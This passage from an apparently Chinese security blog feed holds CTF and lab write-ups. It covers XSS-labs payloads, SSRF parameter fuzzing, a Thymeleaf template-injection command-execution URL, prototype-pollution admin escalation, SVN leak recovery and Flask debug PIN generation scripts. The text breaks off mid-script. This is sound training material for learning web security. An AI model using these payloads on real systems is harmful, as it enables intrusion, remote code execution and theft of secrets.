class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;/level1.php?name=&lt;img src=1 onmouseover=alert()&gt;&#x27;</span><br></pre></td></tr></table></figure><p>当然也能用p标签，可以构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;/level1.php?name=&lt;p onmousedown=alert()&gt;哈哈哈&lt;/p&gt;&#x27;</span><br></pre></td></tr></table></figure><h2 id="13-字母小写化-script替换成空格-最后将空格给实体化-给替换成了空格"><a href="#13-字母小写化-script替换成空格-最后将空格给实体化-给替换成了空格" class="headerlink" title="13.字母小写化,script替换成空格,最后将空格给实体化,&#x2F;给替换成了空格"></a>13.字母小写化,script替换成空格,最后将空格给实体化,&#x2F;给替换成了空格</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0Aonload=alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="14-测试关键字"><a href="#14-测试关键字" class="headerlink" title="14.测试关键字"></a>14.测试关键字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;; &amp;arg02=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</span><br></pre></td></tr></table></figure><p>将后端第十七关的代码（level17.php）指向的swf文件改为index.png</p><p>就有个embed标签的区域在啦，其实用不用swf文件都一样的，主要是区域，接着我们构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg02= onclick=alert()</span><br><span class="line">?arg02= onmousedown=alert()</span><br></pre></td></tr></table></figure><h2 id="15-实体化函数在无法闭合"><a href="#15-实体化函数在无法闭合" class="headerlink" title="15.实体化函数在无法闭合"></a>15.实体化函数在无法闭合</h2><p>往Flash里面插入一段js代码，然后手动执行嘛，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;here&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="16-反编译"><a href="#16-反编译" class="headerlink" title="16.反编译"></a>16.反编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(1)&#125;//%26width=123%26height=123</span><br><span class="line">?arg01=id&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(/xss/)&#125;//%26width%26height</span><br></pre></td></tr></table></figure></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-labs靶场实战&quot;&gt;&lt;a href=&quot;#xss-labs靶场实战&quot; class=&quot;headerlink&quot; title=&quot;xss-labs靶场实战&quot;&gt;&lt;/a&gt;xss-labs靶场实战&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Arjun查询参数</title>
    <link href="http://1768161086.github,io/2025/04/02/Arjun%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0/"/>
    <id>http://1768161086.github,io/2025/04/02/Arjun%E6%9F%A5%E8%AF%A2%E5%8F%82%E6%95%B0/</id>
    <published>2025-04-02T11:49:45.000Z</published>
    <updated>2025-04-02T12:00:35.761Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Arjun是什么？"><a href="#1-Arjun是什么？" class="headerlink" title="1.Arjun是什么？"></a><strong>1.Arjun是什么？</strong></h2><p>Arjun 可以查找 URL 端点的查询参数。<a href="https://so.csdn.net/so/search?q=Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F&spm=1001.2101.3001.7020">Web 应用程序</a>使用参数（或查询）来接受用户输入，请考虑以下示例</p><p>url?id&#x3D;751634589</p><h2 id="2-项目安装"><a href="#2-项目安装" class="headerlink" title="2.项目安装"></a>2.项目安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/s0md3v/Arjun</span><br><span class="line">进入该目录执行：</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><h2 id="3-快速使用"><a href="#3-快速使用" class="headerlink" title="3.快速使用"></a><strong>3.快速使用</strong></h2><h3 id="3-1-扫描单个网址"><a href="#3-1-扫描单个网址" class="headerlink" title="3.1.扫描单个网址"></a>3.1.扫描单个网址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arjun -u https://api.example.com/endpoint</span><br></pre></td></tr></table></figure><h3 id="3-2-导入目标"><a href="#3-2-导入目标" class="headerlink" title="3.2.导入目标"></a>3.2.导入目标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arjun -i targets.txt</span><br></pre></td></tr></table></figure><h3 id="3-3-指定-HTTP-方法"><a href="#3-3-指定-HTTP-方法" class="headerlink" title="3.3.指定 HTTP 方法"></a>3.3.指定 HTTP 方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arjun -u https://api.example.com/endpoint -m POST</span><br><span class="line">所有可用的方法有：GET/POST/JSON/XML</span><br></pre></td></tr></table></figure><h3 id="3-4-导出结果"><a href="#3-4-导出结果" class="headerlink" title="3.4.导出结果"></a>3.4.导出结果</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">arjun -u https://api.example.com/endpoint -oJ result.json</span><br><span class="line">-oJ result.json</span><br><span class="line">-oT result.txt</span><br><span class="line">-oB 127.0.0.1:8080</span><br><span class="line">可以使用相应的选项将结果导出到 BurpSuite 或 txt/JSON 文件。</span><br></pre></td></tr></table></figure><h2 id="青少年CTF-穿梭隐藏的密钥"><a href="#青少年CTF-穿梭隐藏的密钥" class="headerlink" title="青少年CTF_穿梭隐藏的密钥"></a>青少年CTF_穿梭隐藏的密钥</h2><p>1.查看代码发现c3s4f.php目录</p><p>2.提示：多fuzzfuzz总能fuzz出点啥</p><p>3.这儿需要我们FUZZ出参数，使用工具<strong>Arjun</strong>（url参数扫描工具）查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arjun -u http://challenge.qsnctf.com:30268/c3s4f.php</span><br></pre></td></tr></table></figure><p>4.得到了参数shell，进行传参?shell&#x3D;123</p><p>5.发现应该是SSRF，直接构造(过滤了127.0.0.1)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shell=http://localtest.me/secret.php</span><br></pre></td></tr></table></figure><p>6.我们得到了需要用到的KEY：MSIBLG ，并且得到下一关的地址cha11eng3.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;k4y.php&#x27;);</span><br><span class="line">include_once(&#x27;flag.php&#x27;);</span><br><span class="line">// Challenge 1</span><br><span class="line">if (isset($_GET[&#x27;DrKn&#x27;])) &#123;</span><br><span class="line">    $text = $_GET[&#x27;DrKn&#x27;];</span><br><span class="line">    if(@file_get_contents($text) == $key) &#123;</span><br><span class="line">        echo &quot;有点东西呢&quot;.&quot;&lt;/br&gt;&quot;.$key1.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;貌似状态不在线啊(╯_╰)&lt;/br&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">// Challenge 2</span><br><span class="line">if (isset($_GET[$key1])) &#123;</span><br><span class="line">    $damei = $_GET[$key1];</span><br><span class="line">    if (hash(&quot;md4&quot;, $damei) == $damei) &#123;</span><br><span class="line">        echo &quot;又近了一步呢，宝~&quot;.&quot;&lt;/br&gt;&quot;.$key2.&quot;&lt;/br&gt;&quot;.$key3;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;达咩哟~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">// Challenge 3</span><br><span class="line">if (isset($_POST[$key2]) &amp;&amp; isset($_POST[$key3])) &#123;</span><br><span class="line">    $user = $_POST[$key2];</span><br><span class="line">    $pass = $_POST[$key3];</span><br><span class="line"></span><br><span class="line">    if (strlen($user) &gt; 4 || strlen($pass) &gt; 5) &#123;</span><br><span class="line">          die(&quot;还得练&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">     if ($user !== $pass &amp;&amp; md5($user) === md5($pass)) &#123;  </span><br><span class="line">          echo &quot;还不错哦&quot;.&quot;$flag&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">          die(&quot;nonono&quot;) ;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>7.直接讲第二关：</p><ul><li>检查GET请求中是否包含参数<code>$key1</code>。</li><li>获取参数<code>$key1</code>的值并检查其MD4哈希值是否等于自身。</li><li>如果匹配，输出提示信息和<code>$key2</code>、<code>$key3</code>；否则，输出错误信息并终止脚本执行。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M[ore.8=0e001233333333333334557778889</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-Arjun是什么？&quot;&gt;&lt;a href=&quot;#1-Arjun是什么？&quot; class=&quot;headerlink&quot; title=&quot;1.Arjun是什么？&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.Arjun是什么？&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;Arjun 可以查找 URL 端点</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>springbootThymeleaf模板注入</title>
    <link href="http://1768161086.github,io/2025/04/01/springbootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>http://1768161086.github,io/2025/04/01/springbootThymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2025-04-01T12:14:10.000Z</published>
    <updated>2025-04-01T12:16:37.999Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2024御网杯-admin"><a href="#2024御网杯-admin" class="headerlink" title="2024御网杯_admin"></a>2024御网杯_admin</h2><p>1.扫目录发现两个目录，admin和login</p><p>2.根据报错页面发现是<a href="https://www.freebuf.com/articles/network/250026.html">springboot Thymeleaf 模板注入</a></p><p>3.找到一篇文章写的很好，利用文章给出的payload打，注意需要在admin目录请求且需要对特殊字符url编码下</p><p>4.payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.200.58.4:3333//admin/?path=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__::.x</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2024御网杯-admin&quot;&gt;&lt;a href=&quot;#2024御网杯-admin&quot; class=&quot;headerlink&quot; title=&quot;2024御网杯_admin&quot;&gt;&lt;/a&gt;2024御网杯_admin&lt;/h2&gt;&lt;p&gt;1.扫目录发现两个目录，admin和login&lt;/p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>svn泄露</title>
    <link href="http://1768161086.github,io/2025/04/01/svn%E6%B3%84%E9%9C%B2/"/>
    <id>http://1768161086.github,io/2025/04/01/svn%E6%B3%84%E9%9C%B2/</id>
    <published>2025-04-01T11:50:49.000Z</published>
    <updated>2025-04-01T12:13:10.077Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2024御网杯-input-data"><a href="#2024御网杯-input-data" class="headerlink" title="2024御网杯_input_data"></a>2024御网杯_input_data</h2><p>1.<a href="https://so.csdn.net/so/search?q=svn&spm=1001.2101.3001.7020">svn</a>泄露，使用SVN泄露的漏洞利用工具dvcs-ripper即可恢复flag文件</p><p>2.安装dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure><p>3.工具使用perl语言，需要<a href="https://so.csdn.net/so/search?q=%E5%AE%89%E8%A3%85perl&spm=1001.2101.3001.7020">安装perl</a>环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure><p>4.进入dvcs-ripper目录,使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-svn.pl -u http://xxx/.svn</span><br></pre></td></tr></table></figure><p>5.cat flag即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2024御网杯-input-data&quot;&gt;&lt;a href=&quot;#2024御网杯-input-data&quot; class=&quot;headerlink&quot; title=&quot;2024御网杯_input_data&quot;&gt;&lt;/a&gt;2024御网杯_input_data&lt;/h2&gt;&lt;p&gt;1.&lt;a h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>javascript原型链污染</title>
    <link href="http://1768161086.github,io/2025/03/31/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://1768161086.github,io/2025/03/31/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2025-03-31T10:09:27.000Z</published>
    <updated>2025-03-31T10:13:57.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="攻防世界-wife-wife"><a href="#攻防世界-wife-wife" class="headerlink" title="攻防世界_wife_wife"></a>攻防世界_wife_wife</h2><p>1.由于使用了assign()，因此存在Javascript原型链污染的漏洞。</p><p>2.进入就是一个登陆界面，尝试sql注入，用御剑扫描，都没有新发现。</p><p>3.注册页面，有一个<code>is admin</code>选项，想要得到正确的flag必须注册admin的账号</p><p>4.当勾选<code>is admin</code>时，必须填入邀请码，否则无法注册</p><p>5.Javascript原型链污染,利用该漏洞的前提是后端使用<strong>Node.js</strong>语言,使用wappalyzer</p><p>6.在注册时输入错误的邀请码，返回如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;2&quot;,&quot;isAdmin&quot;:true,&quot;inviteCode&quot;:&quot;123&quot;&#125;</span><br><span class="line">返回：invalid</span><br></pre></td></tr></table></figure><p>7.在请求报文中，可以看到有isAdmin参数，使用Javascript原型链污染，更改请求报文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;2&quot;,</span><br><span class="line">&quot;__proto__&quot;:&#123;</span><br><span class="line">&quot;isAdmin&quot;:true&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8.管理员用户创建成功，使用该用户登录即可拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;攻防世界-wife-wife&quot;&gt;&lt;a href=&quot;#攻防世界-wife-wife&quot; class=&quot;headerlink&quot; title=&quot;攻防世界_wife_wife&quot;&gt;&lt;/a&gt;攻防世界_wife_wife&lt;/h2&gt;&lt;p&gt;1.由于使用了assign()，因此存在Ja</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>python_django</title>
    <link href="http://1768161086.github,io/2025/03/30/python-django/"/>
    <id>http://1768161086.github,io/2025/03/30/python-django/</id>
    <published>2025-03-30T06:25:39.000Z</published>
    <updated>2025-03-30T06:45:09.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="攻防世界-Cat"><a href="#攻防世界-Cat" class="headerlink" title="攻防世界-Cat"></a>攻防世界-Cat</h2><p>打开发现url输入框</p><p>1.sqlfuzz测试</p><p>2.爆破发现%df和%a0长度较大</p><p>3.查看发现了Django</p><p>4. 既然是django文件还有前端代码，复制后用游览器打开试试</p><p>5.用游览器打开以后最底下可以看到一串提示：You’re seeing this error because you have DEBUG &#x3D; True in your Django settings file. Change that to False, and Django will display a standard page generated by the handler for this status code.</p><p>6.直接所有settings，会发现很多，但是比较特殊的有这个（和settings和database有关，百度搜索）</p><p>7.对应的路径：&#x2F;opt&#x2F;api&#x2F;database.sqlite3</p><p>8.最终的payload：@&#x2F;opt&#x2F;api&#x2F;database.sqlite3</p><p>9.搜索关键字ctf发现flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;攻防世界-Cat&quot;&gt;&lt;a href=&quot;#攻防世界-Cat&quot; class=&quot;headerlink&quot; title=&quot;攻防世界-Cat&quot;&gt;&lt;/a&gt;攻防世界-Cat&lt;/h2&gt;&lt;p&gt;打开发现url输入框&lt;/p&gt;
&lt;p&gt;1.sqlfuzz测试&lt;/p&gt;
&lt;p&gt;2.爆破发现%df</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>flask_pin</title>
    <link href="http://1768161086.github,io/2025/03/29/flask-pin/"/>
    <id>http://1768161086.github,io/2025/03/29/flask-pin/</id>
    <published>2025-03-29T03:01:51.000Z</published>
    <updated>2025-03-29T03:23:29.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flask-pin"><a href="#flask-pin" class="headerlink" title="flask_pin"></a>flask_pin</h1><h2 id="1-什么是pin码"><a href="#1-什么是pin码" class="headerlink" title="1.什么是pin码"></a><strong>1.什么是pin码</strong></h2><p>pin码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式。</p><h2 id="2-PIN生成要素"><a href="#2-PIN生成要素" class="headerlink" title="2.PIN生成要素"></a>2.<strong>PIN生成要素</strong></h2><ul><li>username，用户名</li><li>modname，默认值为flask.app</li><li>appname，默认值为Flask</li><li>moddir，flask库下app.py的绝对路径</li><li>uuidnode，当前网络的mac地址的十进制数</li><li>machine_id，docker机器id</li></ul><p><strong>username</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getpass.getuser()读取，通过文件读取/etc/passwd</span><br></pre></td></tr></table></figure><p><strong>modname</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getattr(mod,“file”,None)读取，默认值为flask.app</span><br></pre></td></tr></table></figure><p><strong>appname</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getattr(app,“name”,type(app).name)读取，默认值为Flask</span><br></pre></td></tr></table></figure><p><strong>moddir</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取</span><br></pre></td></tr></table></figure><p><strong>uuidnode</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过uuid.getnode()读取，通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算</span><br></pre></td></tr></table></figure><p><strong>machine_id</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id，docker靶机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id，在非docker环境下读取后两个，非docker环境三个都需要读取</span><br><span class="line">/etc/machine-id</span><br><span class="line">/proc/sys/kernel/random/boot_id</span><br><span class="line">/proc/self/cgroup</span><br></pre></td></tr></table></figure><h2 id="3-上面的pin元素能干嘛呢"><a href="#3-上面的pin元素能干嘛呢" class="headerlink" title="3.上面的pin元素能干嘛呢"></a>3.<strong>上面的pin元素能干嘛呢</strong></h2><p>生成pin码的脚本如下：</p><p>pytho3.5版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;,# username</span><br><span class="line">    &#x27;flask.app&#x27;,# modname</span><br><span class="line">    &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">    &#x27;/usr/local/lib/python3.5/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485377892354&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">    &#x27;32e48d371198e8420c53b0a1fa37e94d&#x27;# get_machine_id(), /etc/machine-id+/proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>官方是通过系统命令获取相对应的值，我们采用读文件获取值后放到脚本(也就是官方加密的方法)里进行加密，3.6采用MD5加密，3.8采用sha1加密，所以脚本稍有不同</p><p>python3.6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#MD5</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     &#x27;flaskweb&#x27;# username</span><br><span class="line">     &#x27;flask.app&#x27;,# modname</span><br><span class="line">     &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">     &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     &#x27;25214234362297&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">     &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;# get_machine_id(), /etc/machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">   h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">   num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">   for group_size in 5, 4, 3:</span><br><span class="line">       if len(num) % group_size == 0:</span><br><span class="line">          rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                      for x in range(0, len(num), group_size))</span><br><span class="line">          break</span><br><span class="line">       else:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3.8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#sha1</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import 